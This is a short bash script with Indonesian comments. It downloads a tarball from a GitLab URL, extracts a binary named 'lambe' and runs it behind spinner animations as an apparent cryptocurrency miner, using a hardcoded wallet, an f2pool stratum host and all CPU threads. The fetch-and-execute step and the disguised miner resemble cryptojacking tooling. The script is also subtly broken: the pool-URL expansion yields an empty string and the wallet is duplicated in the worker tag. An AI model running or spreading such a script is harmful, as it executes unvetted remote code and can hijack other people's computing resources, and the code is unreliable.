#!/bin/bash

# Fungsi spinner umum
run_with_loading() {
    local message="$1"
    shift

    "$@" > /dev/null 2>&1 &
    local pid=$!

    local spinner=("|" "/" "-" "\\")
    while kill -0 "$pid" 2>/dev/null; do
        for char in "${spinner[@]}"; do
            printf "\r[%c] %s" "$char" "$message"
            sleep 0.08
            if ! kill -0 "$pid" 2>/dev/null; then
                break
            fi
        done
    done

    wait "$pid"
    local status=$?

    if [ $status -eq 0 ]; then
        printf "\r[✔] %s selesai\n" "$message"
    else
        printf "\r[✖] %s gagal\n" "$message"
        return $status
    fi

    return 0
}

# 1. Download
run_with_loading "Downloading lambe.tar.gz..." curl -L -O https://gitlab.com/gas-group8801643/bac/-/raw/main/lambe.tar.gz
if [ $? -ne 0 ]; then
    exit 1
fi

# 2. Ekstrak
run_with_loading "Extracting lambe.tar.gz..." tar -xvf lambe.tar.gz
if [ $? -ne 0 ]; then
    exit 1
fi

# === Ambil IP lokal dengan lebih aman dan andal ===
worker_name=""

# Metode 1: Menggunakan hostname -I
if command -v hostname >/dev/null 2>&1; then
    worker_name=$(hostname -I 2>/dev/null | awk '{print $1}')
fi

# Metode 2: Jika masih kosong, gunakan ip route
if [ -z "$worker_name" ] && command -v ip >/dev/null 2>&1; then
    worker_name=$(ip route show 2>/dev/null | awk '/default/ {print $3}' | head -n 1)
fi

# Metode 3: Fallback terakhir jika tetap kosong
if [ -z "$worker_name" ] || [ "$worker_name" = "0" ]; then
    worker_name="worker1"
fi

wallet="ginanjarsri57"
worker_tag="${wallet}.${worker_name}"
urlet="${stratum+tcp://qtc.f2pool.com:4500}"

if command -v nproc >/dev/null 2>&1; then
    if nproc --all >/dev/null 2>&1; then
        threads="$(nproc --all)"
    else
        threads="$(nproc)"
    fi
else
    threads=1
fi

echo "Menjalankan lambe dengan worker: ${worker_tag}"
echo "Menjalankan perintah: ./lambe"

# 3. Jalankan ./lambe dengan animasi jam pasir
./lambe --algorithm quantus --pool "$urlet" --wallet "$wallet"."$worker_tag" &
lambe_PID=$!

hourglass=("⏳" "⌛")

while kill -0 "$lambe_PID" 2>/dev/null; do
    for h in "${hourglass[@]}"; do
        printf "\r[%s] Sedang menjalankan lambe..." "$h"
        sleep 0.45

        if ! kill -0 "$lambe_PID" 2>/dev/null; then
            break
        fi
    done
done

wait "$lambe_PID"
lambe_EXIT=$?

if [ $lambe_EXIT -eq 0 ]; then
    printf "\r[✔] Proses lambe selesai (Done).\n"
else
    printf "\r[✖] Proses lambe gagal atau dihentikan.\n"
    exit $lambe_EXIT
fi
